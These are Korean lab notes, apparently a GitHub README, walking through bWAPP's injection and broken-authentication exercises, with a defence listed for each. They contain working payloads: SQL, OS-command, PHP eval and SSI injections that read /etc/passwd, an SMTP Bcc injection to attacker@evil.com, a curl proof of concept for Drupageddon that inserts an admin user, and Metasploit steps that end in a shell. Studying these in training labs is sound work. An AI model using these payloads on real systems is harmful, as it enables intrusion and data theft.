# 🛡️ bWAPP 취약점 학습 정리

> bWAPP(buggy Web APPlication)은 다양한 웹 취약점을 안전한 환경에서 직접 실습해볼 수 있도록 만들어진 모의 해킹 훈련용 웹 애플리케이션입니다. 본 문서는 개인 학습 과정에서 정리한 풀이/공략 노트입니다.

<img width="486" height="187" alt="스크린샷 2026-06-25 163753" src="https://github.com/user-attachments/assets/bc645a11-170a-44cb-82c7-751d22908f8c" />


---

## 📑 목차

1. [전체 요약표](#전체-요약표)
2. [A1 - Injection](#a1---injection)
3. [A2 - Broken Authentication & Session Management](#a2---broken-authentication--session-management)
4. [실습 시 자주 쓰는 도구 정리](#실습-시-자주-쓰는-도구-정리)

---

## 전체 요약표

| # | 분류 | 취약점 | 핵심 페이로드/명령 | 한 줄 개념 | 방어법 |
|---|------|--------|---------------------|------------|--------|
| 1 | Injection | HTML Injection – Reflected (GET) | `<h1>hack</h1>` | URL 파라미터가 그대로 HTML로 출력됨 | 출력 시 HTML 인코딩(escape) |
| 2 | Injection | HTML Injection – Reflected (POST) | `<h1>hack</h1>` (폼 필드) | POST 파라미터 미검증 출력 | 입력값 검증 + 출력 인코딩 |
| 3 | Injection | HTML Injection – Reflected (URL) | `firstname=<h1>test</h1>` | Referer/URL 값이 그대로 반영 | Referer 등 신뢰 불가 입력값도 인코딩 |
| 4 | Injection | HTML Injection – Stored (Blog) | `<h1>hack</h1>` (게시글 등록) | DB에 저장 후 모든 방문자에게 노출 | 저장 전/출력 전 모두 인코딩 |
| 5 | Injection | iFrame Injection | `?ParamUrl=http://공격자주소` | 파라미터 값이 `<iframe src="">` 에 그대로 삽입 | 화이트리스트 기반 URL 검증 |
| 6 | Injection | LDAP Injection | `*)(uid=*))(&(uid=*` | 특수문자로 LDAP 필터 조작 | LDAP 메타문자 escape |
| 7 | Injection | SMTP Injection | `CRLF` + `Bcc: attacker@evil.com` | 메일 헤더에 개행 삽입해 헤더 조작 | 개행문자 필터링 |
| 8 | Injection | OS Command Injection | `127.0.0.1; id` | 입력값이 OS 명령어로 그대로 실행 | 화이트리스트/이스케이프, exec 계열 함수 미사용 |
| 9 | Injection | OS Command Injection (Blind) | `127.0.0.1 \| ping -c 3 attacker` | 결과가 화면에 보이지 않아 시간차/DNS로 확인 | 동일 |
| 10 | Injection | PHP Code Injection | `message=hack;system("id")` | `eval()` 류 함수에 사용자 입력이 그대로 실행 | eval 사용 금지, 입력 검증 |
| 11 | Injection | SSI Injection | `<!--#exec cmd="cat /etc/passwd"-->` | 서버가 SSI 지시어를 해석/실행 | SSI 비활성화, 입력 필터링 |
| 12 | Injection | SQL Injection (GET/Search) | `'or 1=1#` | WHERE 조건이 항상 참이 되어 전체 노출 | Prepared Statement |
| 13 | Injection | SQL Injection (GET/Select) | `1 or 1=1` | 동일 | Prepared Statement |
| 14 | Injection | SQL Injection (POST/Select) | `movie=1'` + Repeater | POST 파라미터 SQLi | Prepared Statement |
| 15 | Injection | SQL Injection (AJAX/JSON/jQuery) | `'union select 1,table_name,3,4,5,6,7 from information_schema.tables#` | UNION으로 메타데이터(테이블명) 추출 | Prepared Statement, 최소 권한 DB 계정 |
| 16 | Injection | SQL Injection (Login Form/Hero) | `'or 1=1#` (아이디), 비번 임의 입력 | 로그인 쿼리 자체를 우회 | Prepared Statement |
| 17 | Injection | SQL Injection (SQLite) | `'or 1=1--` (뒤에 공백 필요) | SQLite 문법 특성 이용 | Prepared Statement |
| 18 | Injection | Drupal SQLi (Drupageddon, CVE-2014-3704) | `msfconsole` → `exploit/multi/http/drupal_drupageddon` | 배열 파라미터 처리 취약점으로 SQL 임의 실행 | 패치(SA-CORE-2014-005) 적용 |
| 19 | Injection | SQL Injection – Stored (User-Agent) | User-Agent 헤더에 `'or 1=1#` 등 삽입 | 저장된 헤더값이 추후 쿼리에 사용됨 | 모든 입력 출처(헤더 포함) Prepared Statement 적용 |
| 20 | Injection | XML/XPath Injection (Login Form) | `'or 1=1 or'` | XPath 쿼리 조건을 항상 참으로 변조 | XPath 파라미터화, 입력 검증 |
| 21 | Injection | XML/XPath Injection (Search) | `')or1=1]('a` | 검색 조건 예측 불가능한 결과 노출 | 동일 |
| 22 | Broken Auth | Captcha Bypassing | Burp로 캡차 파라미터 제거/재전송 | 서버가 캡차 정답을 제대로 검증하지 않음 | 서버 측 캡차 검증 강화, 일회성 토큰 |
| 23 | Broken Auth | Forgotten Function | 페이지 소스 보기 | 비밀번호 찾기 기능에 정보 노출 | 민감정보 클라이언트 노출 금지 |
| 24 | Broken Auth | Insecure Login Forms | 페이지 소스 보기(주석 등) | 소스코드 내 힌트/주석으로 계정정보 노출 | 소스에 자격증명/힌트 남기지 않기 |
| 25 | Broken Auth | Logout Management | 로그아웃 후 뒤로가기 | 세션이 서버에서 완전히 무효화되지 않음 | 로그아웃 시 서버 세션 즉시 파기 |
| 26 | Broken Auth | Password Attacks | `$$` 입력 후 Burp Intruder | 비정상 입력에 대한 에러 핸들링 취약 | 입력 길이/형식 검증, 에러 메시지 최소화 |
| 27 | Broken Auth | Weak Passwords | `test/test` (Burp로 자동화) | 추측 가능한 기본 계정 존재 | 강력한 비밀번호 정책, 계정 잠금 |
| 28 | Broken Auth | Session Mgmt – Administrative Portals | URL 파라미터 `0→1` 변경 | IDOR(권한 검증 없는 직접 객체 참조) | 서버 측 권한(인가) 검증 |
| 29 | Broken Auth | Cookies (HttpOnly) | 쿠키 속성 확인 | `HttpOnly` 없으면 JS로 쿠키 탈취 가능 | 모든 세션 쿠키에 `HttpOnly`, `Secure` 속성 부여 |

---

## A1 - Injection

### 1. HTML Injection – Reflected (GET)

**개념**
사용자가 입력한 GET 파라미터 값이 서버 측 검증/인코딩 없이 그대로 HTML 응답에 출력되는 취약점입니다. 입력값에 HTML 태그를 넣으면 브라우저가 이를 그대로 렌더링합니다.

**공략 절차**
1. 입력 폼(firstname, lastname)에 HTML 태그를 넣어본다.
2. 특수문자가 막히는 경우를 대비해 URL 인코딩을 적용한다. (예: 구글 등에서 "URL encode" 검색 → 인코더에 `<h1>hack</h1>` 입력 → 인코딩된 값 복사)
3. 인코딩된 값을 URL 파라미터에 붙여서 요청한다.

**핵심 페이로드**
```
http://[bWAPP-IP]/bWAPP/htmli_get.php?firstname=%3Ch1%3Ehack%3C%2Fh1%3E&lastname=test&form=submit
```

<img width="1058" height="1023" alt="beeboxreflect" src="https://github.com/user-attachments/assets/981923db-026b-43b9-b1a9-9cd8cef251e8" />


**방어법**: 출력 시 `htmlspecialchars()` 등으로 HTML 엔티티 인코딩 처리.

---

### 2. HTML Injection – Reflected (POST)

**개념**: GET 방식과 동일한 원리지만 데이터가 POST Body로 전달됩니다.

**공략 절차**
1. 폼에 직접 `<h1>hack</h1>` 입력 후 제출(POST 방식이라 URL 인코딩 없이도 폼이 그대로 전송됨).
2. 결과 확인 → 입력한 태그가 그대로 렌더링되는지 확인.

**방어법**: GET 방식과 동일하게 출력 인코딩.

---

### 3. HTML Injection – Reflected (URL)

**개념**: 현재 요청 URL 자체(또는 Referer 헤더 등)가 페이지에 그대로 반영되는 경우의 HTML 인젝션입니다.

**공략 절차**
1. Burp Suite로 요청을 가로채서(Intercept) 요청 라인(예: 13번째 줄)에 `<h1>` 태그를 삽입해본다.
2. 한 번에 반영되지 않을 수 있으므로, 다른 페이지로 이동했다가 다시 요청을 보내본다.
3. 새로 생성된 요청 줄(예: 14번째 줄)에서 파라미터가 반영되는지 확인.

**핵심 페이로드**
```
firstname=<h1>test</h1>&lastname=test&form=submit
```

**방어법**: Referer, URL 등 클라이언트가 제어 가능한 모든 값은 출력 전 인코딩.

---

### 4. HTML Injection – Stored (Blog)

**개념**: 입력값이 DB 등에 저장된 후, 다른 사용자가 해당 콘텐츠(블로그 글 등)를 조회할 때마다 실행/렌더링되는 영구적(Stored) 형태의 인젝션입니다. Reflected보다 파급력이 큽니다(모든 방문자가 영향받음).

**공략 절차**
1. 블로그 글쓰기 폼에 `<h1>hack</h1>` 와 같은 HTML 태그를 입력하고 등록.
2. 게시글 목록/상세 페이지를 새로고침하여 태그가 렌더링되는지 확인.

**방어법**: 저장 시점/출력 시점 모두에서 검증 및 인코딩 (Defense in Depth).

---

### 5. iFrame Injection

**개념**: 페이지가 사용자 입력 파라미터를 검증 없이 `<iframe src="...">` 에 그대로 삽입하는 취약점입니다. 공격자는 임의의 외부 사이트(피싱 페이지 등)를 iframe으로 삽입할 수 있습니다.

**공략 절차**
1. `robots.txt` 파일을 확인한다. (사이트 구조를 알려주는 일종의 "지도" 역할 → 어떤 디렉토리/파일이 있는지 공격자에게 정보 제공)
2. 취약한 파라미터(`ParamUrl` 등)에 임의의 URL을 넣어 iframe에 삽입되는지 확인.

**핵심 페이로드**
```
?ParamUrl=http://[원하는 사이트 주소]
```

**방어법**: 허용된 URL만 화이트리스트로 관리, `X-Frame-Options`/CSP 적용.

---

### 6. LDAP Injection

**개념**
LDAP(Lightweight Directory Access Protocol)은 네트워크 상의 조직·사용자·디바이스 등의 정보를 중앙에서 관리하고 검색·인증하는 프로토콜입니다. 사용자 입력이 LDAP 검색 필터(쿼리)에 그대로 삽입되면, 특수문자(`*`, `(`, `)`, `&`, `|`, `\`)를 이용해 검색 조건을 조작하여 인증 우회나 정보 노출이 가능합니다.

**공략 절차**
1. 실습 환경 초기화/리셋: `?clear=yes` 파라미터로 상태 초기화.
2. 로그인/검색 필드에 LDAP 메타문자를 포함한 페이로드를 입력해 필터 조작을 시도.

**대표 페이로드 (일반론)**
```
*)(uid=*))(&(uid=*
```

**방어법**: LDAP 메타문자 escape, 입력값 길이/형식 제한.

---

### 7. SMTP Injection

**개념**: 메일 발송 기능에서 사용자 입력값(보통 받는사람/제목/본문)에 CRLF(개행문자)와 함께 추가 헤더(`Bcc:`, `Cc:` 등)를 삽입하면, 메일 서버가 이를 새로운 헤더로 해석하여 의도하지 않은 수신자에게 메일이 가거나 스팸 릴레이로 악용될 수 있습니다.

**공략 절차**
1. Burp Suite로 메일 발송 요청을 가로챈다.
2. 입력 필드에 개행 + 추가 헤더를 삽입해 전송한다.

**핵심 페이로드 (일반론)**
```
victim@test.com%0ABcc:attacker@evil.com
```

**방어법**: 개행문자(`\r\n`) 필터링, 신뢰된 메일 라이브러리 사용(헤더 인젝션 방지 내장).

---

### 8. OS Command Injection

**개념**: 사용자 입력값이 검증 없이 OS 셸 명령어의 일부로 사용되어, 구분자(`;`, `|`, `&&` 등)를 통해 임의 명령을 실행할 수 있는 취약점입니다.

**공략 절차**
1. 대상(target) 입력 필드에 정상적인 값(IP 등)과 함께 명령어 구분자를 추가.
2. 결과 화면에 명령 실행 결과(예: `id` 명령 결과인 uid/gid 정보)가 출력되는지 확인.

**핵심 페이로드**
```
127.0.0.1; id
```

**방어법**: 셸 명령 실행 함수 사용 자제, 화이트리스트 검증, 파라미터화된 API 사용.

---

### 9. OS Command Injection (Blind)

**개념**: 명령 실행은 되지만 그 결과가 화면에 직접 출력되지 않는 경우입니다. 응답 시간 차이, DNS 조회, 외부로의 요청 발생 여부 등으로 우회적으로 확인합니다.

**공략 절차**
1. Burp Suite로 요청을 가로챈다.
2. `target` 파라미터에 정상 IP(`127.0.0.1`)를 입력 → 요청 본문(예: 16번째 줄)에 `target=127.0.0.1` 확인.
3. 명령어 구분자를 추가하여 Forward(전송) 후, 응답 지연이나 별도 채널(ping, DNS 등)로 실행 여부를 확인.

**핵심 페이로드 (일반론)**
```
127.0.0.1 & ping -c 5 127.0.0.1
```

**방어법**: 8번과 동일.

---

### 10. PHP Code Injection

**개념**: `eval()` 등 사용자 입력을 PHP 코드로 직접 실행하는 함수에 입력값이 그대로 전달되어, 임의 PHP 코드(시스템 명령 포함)를 실행할 수 있는 취약점입니다.

**공략 절차**
1. 주소(URL)에 `?message=` 파라미터를 추가하고 임의 문자열(`hack`)을 넣어 정상 출력되는지 확인.
2. PHP 구문 종결자(`;`)와 함수 호출을 추가하여 시스템 명령 실행 시도.

**핵심 페이로드**
```
?message=hack;system("id");
```

**방어법**: `eval()` 사용 금지, 입력값을 코드로 해석하지 않도록 구조 변경.

---

### 11. Server-Side Includes (SSI) Injection

**개념**: SSI는 웹 서버가 클라이언트에 페이지를 전송하기 전에 페이지 내 포함된 지시어(Directive)를 해석하여 실행하는 기능입니다. 사용자 입력이 SSI 지시어로 해석될 수 있는 위치에 그대로 삽입되면, 공격자가 서버에서 임의 명령을 실행시킬 수 있습니다. "서버에게 페이지를 꾸미라고 준 명령어를 공격자가 가로채 자기 마음대로 명령을 실행시키는 것"으로 이해하면 쉽습니다.

**공략 절차**
1. 입력 필드에 SSI 지시어 형태의 페이로드를 삽입.
2. 서버가 이를 해석/실행하여 명령 결과가 출력되는지 확인.

**핵심 페이로드**
```
<!--#exec cmd="cat /etc/passwd"-->
```

**방어법**: SSI 기능 비활성화(불필요 시), 사용자 입력에 대한 엄격한 필터링.

---

### 12. SQL Injection (GET/Search)

**개념**: 검색 기능의 입력값이 SQL 쿼리에 그대로 들어가 쿼리 구조를 변경할 수 있는 가장 고전적인 SQL 인젝션입니다.

- **따옴표(`'`)**: 쿼리의 "데이터 영역"을 탈출시키는 열쇠 역할 → 앞선 쿼리 문자열을 닫아버림
- **주석(`--`, `#` 등)**: 뒤따라오는 "쿼리 찌꺼기"를 무시시켜 문법 오류를 방지하는 역할

**공략 절차**
1. 검색창에 따옴표로 기존 쿼리를 깨뜨리는 페이로드 입력 → DB 취약점(에러/이상동작) 확인.
2. `UNION SELECT`로 컬럼 수를 맞춰 임의 데이터 노출 시도.

**핵심 페이로드**
```sql
'or 1=1#
'union select 1,2,3,4,5,6,7#
```

**방어법**: Prepared Statement(바인드 변수) 사용, 입력값 검증, 최소 권한 DB 계정.

---

### 13. SQL Injection (GET/Select)

**개념**: URL 파라미터(예: 영화 ID)로 직접 조회하는 쿼리에 조건을 추가하여 항상 참(True)이 되게 만들어 전체 데이터를 노출시키는 기법.

**공략 절차**
1. URL 중간의 ID 파라미터 값을 `1 or 1=1` 형태로 변경.
2. 첫 번째 쿼리 행만 보이던 것이 전체 데이터로 확장되는지 확인.

**핵심 페이로드**
```sql
1 or 1=1
```

---

### 14. SQL Injection (POST/Select)

**개념**: 동일한 원리지만 파라미터가 POST로 전달되는 경우.

**공략 절차**
1. `movie` 파라미터에 `1'` 입력 후 요청을 Burp Suite로 가로챈다.
2. Repeater 탭으로 보내서 여러 페이로드를 반복 테스트.

**핵심 페이로드**
```sql
movie=1'
```

<img width="1070" height="1029" alt="repeate기능,sql injection select" src="https://github.com/user-attachments/assets/3fd1fc55-2000-479e-8f9e-7376910152cd" />


---

### 15. SQL Injection (AJAX/JSON/jQuery)

**개념**: AJAX로 비동기 호출되는 API 엔드포인트도 동일하게 SQL 인젝션에 취약할 수 있습니다. `UNION SELECT`로 `information_schema`를 조회하면 DB 메타데이터(테이블명, 컬럼명, DB 버전 등)를 추출할 수 있습니다.

**공략 절차**
1. AJAX 요청 파라미터에 UNION 기반 페이로드 삽입.
2. `information_schema.tables`를 조회하여 영화 테이블 목록 사이에서 DB 버전 정보 등 부가 정보가 노출되는지 확인.

**핵심 페이로드**
```sql
'union select 1, table_name, 3, 4, 5, 6, 7 from information_schema.tables#
```

> 💡 참고: "서드파티(Third-party)"란 직접 다 개발하지 않고 외부 업체의 기술·제품·서비스를 빌려 쓸 때, 그 외부 업체를 가리키는 용어입니다.

---

### 16. SQL Injection – Login Form/Hero

**개념**: 로그인 쿼리(`SELECT * FROM users WHERE id='입력값' AND pw='입력값'`) 자체를 조작하여 비밀번호를 몰라도 인증을 통과시키는 기법.

**공략 절차**
1. 아이디 필드에 `'or 1=1#` 입력, 비밀번호는 임의 값(`1234`) 입력.
2. 로그인 성공("Welcome Neo" 등 메시지) 확인.

**핵심 페이로드**
```
ID: 'or 1=1#
PW: 1234
```

---

### 17. SQL Injection (SQLite)

**개념**: SQLite는 일반 SQL과 문법이 약간 다르며, 주석 처리 시 `--` 뒤에 공백이 필요합니다.

**공략 절차**
1. 입력값에 `'or 1=1--` (마지막에 공백 포함) 입력.
2. 영화 목록 전체가 노출되는지 확인.

**핵심 페이로드**
```sql
'or 1=1--
```

---

### 18. Drupal SQL Injection (Drupageddon, CVE-2014-3704 / SA-CORE-2014-005)

**개념**: Drupal 7.x의 데이터베이스 추상화 계층(DB API)이 배열 형태의 파라미터를 처리할 때 발생한 SQL 인젝션 취약점입니다. 인증 없이도 임의 SQL 실행(나아가 RCE)까지 가능했던 매우 치명적인 취약점이었습니다.

**공략 절차 (curl PoC)**
```bash
curl -X POST -d "name[0; insert into users (uid, name, pass, status) values (10, 'admin1', 'pass', 1); --]=test" \
http://[bWAPP-IP]/drupal/?q=user/login
```

**공략 절차 (Metasploit 활용)**
```bash
msfconsole
search drupal
use exploit/multi/http/drupal_drupageddon   # search 결과 인덱스는 환경마다 다를 수 있음
show options
set LHOST [공격자IP]
set RHOST [Drupal서버IP]
set TARGETURI /drupal/
exploit

# 쉘 획득 후
cat /etc/passwd
```

<img width="1082" height="1036" alt="metasploit" src="https://github.com/user-attachments/assets/6f291a58-d2e2-451f-9377-0ac257bd9ec0" />


**방어법**: 패치(SA-CORE-2014-005) 적용 / 최신 버전 업그레이드.

---

### 19. SQL Injection – Stored (User-Agent)

**개념**: User-Agent 같은 HTTP 헤더 값이 별도 검증 없이 DB에 저장되었다가, 추후(관리자 로그 조회 화면 등) 쿼리에 사용되며 실행되는 Stored SQLi입니다.

**공략 절차**
1. Burp Suite로 요청을 가로채서 `User-Agent` 헤더 값을 SQLi 페이로드로 변경.
2. 요청을 전송 → 저장된 헤더 값이 사용되는 화면(로그 등)에서 결과 확인.

**핵심 페이로드**
```
User-Agent: 'or 1=1#
```

**방어법**: 헤더값을 포함한 모든 사용자 제어 입력에 Prepared Statement 적용.

---

### 20. XML/XPath Injection (Login Form)

**개념**
XML 문서는 계층적인 트리(Tree) 구조이며, XPath는 그 안에서 원하는 노드(값)을 정확히 찾아내는 "주소 문법"입니다. 로그인 로직이 XML 데이터를 XPath 쿼리로 조회하는 경우, SQL 인젝션과 유사하게 조건을 조작해 인증을 우회할 수 있습니다.

**XPath 예시 (이해를 돕기 위한 예제 데이터)**
```xml
<library>
    <book id="101">
        <title>해킹의 정석</title>
        <author>홍길동</author>
    </book>
    <book id="102">
        <title>웹 보안 마스터</title>
        <author>김철수</author>
    </book>
</library>
```
| XPath 쿼리 | 결과 |
|---|---|
| `/library/book/title` | 해킹의 정석, 웹 보안 마스터 |
| `/library/book[@id='102']/author` | 김철수 |
| `/library/book[author='홍길동']/title` | 해킹의 정석 |

**공략 절차**
1. 로그인 아이디 필드에 XPath 조건을 항상 참으로 만드는 페이로드 입력.
2. 비밀번호 없이 로그인 성공 여부 확인.

**핵심 페이로드**
```
'or 1=1 or'
```

---

### 21. XML/XPath Injection (Search)

**개념**: 검색 카테고리 등의 파라미터가 XPath 조건문에 그대로 들어가는 경우, 괄호와 논리연산자로 조건을 깨뜨려 전체 데이터를 노출시킬 수 있습니다.

**공략 절차**
1. 검색 파라미터에 XPath 구문을 깨뜨리는 페이로드 입력.
2. 카테고리와 무관하게 전체 결과가 노출되는지 확인.

**핵심 페이로드**
```
horror=')or1=1][('a
```

---

## A2 - Broken Authentication & Session Management

### 1. Captcha Bypassing

**개념**: 캡차(CAPTCHA)는 사람과 자동화 봇을 구분하기 위한 장치지만, 서버가 캡차 응답값을 제대로 검증하지 않거나 클라이언트 측 검증에만 의존하면 우회가 가능합니다.

**공략 절차**
1. 정상적인 절차로 회원가입/로그인을 진행하다가 캡차 입력 단계에서 요청을 Burp Suite로 가로챈다(Intercept).
2. 캡차 관련 파라미터를 제거하거나 임의 값으로 변경하여 전송(Forward)해 본다.

---

### 2. Forgotten Function (비밀번호 찾기)

**개념**: "비밀번호를 잊으셨나요?" 기능이 보안 질문, 토큰 생성 로직 등에서 정보를 과도하게 노출하거나 추측 가능한 경우 악용될 수 있습니다.

**공략 절차**
1. 비밀번호 찾기 페이지로 이동.
2. 동작을 관찰하며 정보 노출 여부 확인.

---

### 3. Insecure Login Forms

**개념**: 로그인 폼의 클라이언트 측 소스코드(HTML 주석, 숨겨진 필드, JS 등)에 민감한 정보가 그대로 남아있는 경우입니다.

**공략 절차**
1. 로그인 페이지에서 "페이지 소스 보기"(Ctrl+U) 실행.
2. 소스 내 주석이나 힌트(예: "토니 스타크" 같은 단서)에서 계정정보/힌트를 찾아낸다.

---

### 4. Logout Management

**개념**: 로그아웃 처리가 클라이언트 측(쿠키 삭제 등)에만 적용되고 서버 측 세션은 그대로 유효한 경우, 브라우저 "뒤로 가기"만으로 로그인 상태가 복구될 수 있습니다.

**공략 절차**
1. 로그인 후 정상적으로 로그아웃 수행.
2. 브라우저 뒤로 가기 버튼을 눌러 이전 페이지(로그인 상태였던 페이지)가 다시 보이는지 확인.

---

### 5. Password Attacks

**개념**: 비정상적인 입력에 대한 애플리케이션의 에러 처리 방식을 분석하여 취약점(버그/우회 조건)을 찾아내는 기법입니다.

**공략 절차**
1. 비밀번호 필드에 `$$` 같은 비정상 문자를 입력해 반응을 관찰.
2. Burp Suite Intruder로 다양한 페이로드를 자동 대입하여 패턴(버그) 발견.

**핵심 페이로드**
```
$$
```

---

### 6. Weak Passwords

**개념**: 추측하기 쉬운 기본/취약 계정정보(예: `test`/`test`)가 존재하는 경우.

**공략 절차**
1. 추측 가능한 자격증명으로 직접 로그인 시도.
2. 자동화가 필요하면 Burp Suite Intruder로 사전(Dictionary) 대입.

**핵심 자격증명**
```
ID: test
PW: test
```

---

### 7. Session Mgmt. – Administrative Portals

**개념**: IDOR(Insecure Direct Object Reference) — URL/파라미터의 ID 값만 바꾸면 서버가 권한 검증 없이 다른 사용자의 데이터를 그대로 보여주는 취약점입니다.

**공략 절차**
1. URL 끝의 ID 값(예: `0`)을 다른 값(`1`)으로 변경해 요청.
2. 본인 권한 밖의 정보가 노출되는지 확인.

---

### 8. Cookies (HttpOnly)

**개념**
`HttpOnly` 속성이 없는 쿠키는 자바스크립트(`document.cookie`)로 읽거나 수정할 수 있어, XSS와 결합 시 세션 쿠키를 탈취당할 위험이 있습니다. `HttpOnly` 속성이 설정되면 브라우저만 해당 쿠키를 사용할 수 있고, 자바스크립트는 그 쿠키가 존재하지 않는 것처럼 인식합니다 — 즉 "자바스크립트의 접근을 막는 자물쇠"입니다.

**공략 절차**
1. 개발자 도구(F12) → Application/Storage 탭에서 쿠키 속성 확인.
2. `HttpOnly` 체크 여부 확인 → 없다면 `document.cookie`로 콘솔에서 읽기 시도.

**방어법**: 세션 쿠키 발급 시 `HttpOnly`, `Secure`, `SameSite` 속성을 함께 설정.

---

## 실습 시 자주 쓰는 도구 정리

| 도구 | 용도 |
|---|---|
| **Burp Suite (Proxy/Intercept)** | 요청/응답을 가로채서 파라미터, 헤더(Referer, User-Agent 등)를 자유롭게 수정 |
| **Burp Suite Repeater** | 동일 요청을 반복 전송하며 페이로드를 바꿔 테스트 |
| **Burp Suite Intruder** | 여러 페이로드를 자동으로 대입(무차별 대입, 퍼징) |
| **URL Encoder/Decoder** | 특수문자가 필터링될 때 URL 인코딩으로 우회 시도 |
| **msfconsole (Metasploit)** | 알려진 CVE에 대한 익스플로잇 모듈 검색/실행 (`search`, `use`, `set`, `exploit`) |
| **curl** | 간단한 PoC(Proof of Concept) 요청을 빠르게 재현 |
| **브라우저 개발자 도구** | 페이지 소스 보기, 쿠키 속성(HttpOnly 등) 확인 |

---

### 📌 참고: 폰 노이만 구조 (메모해둔 배경지식)

> 컴퓨터 구조는 명령을 처리하는 **CPU**, 데이터를 임시 저장하는 **메모리**, 그리고 이들을 연결하는 **버스(Bus)** 로 이루어지며, 데이터를 메모리에 저장해두고 CPU가 하나씩 꺼내어 처리하는 **폰 노이만 방식**이 핵심입니다. (CPU / Memory / I/O)

<img width="829" height="761" alt="스크린샷 2026-06-25 133147" src="https://github.com/user-attachments/assets/8669e822-cf7a-4bc4-aa01-011eb5026c70" />


---

> ⚠️ 본 자료는 bWAPP과 같이 학습을 위해 의도적으로 취약하게 설계된 환경에서의 실습 정리이며, 허가받지 않은 시스템에는 절대 적용해서는 안 됩니다.
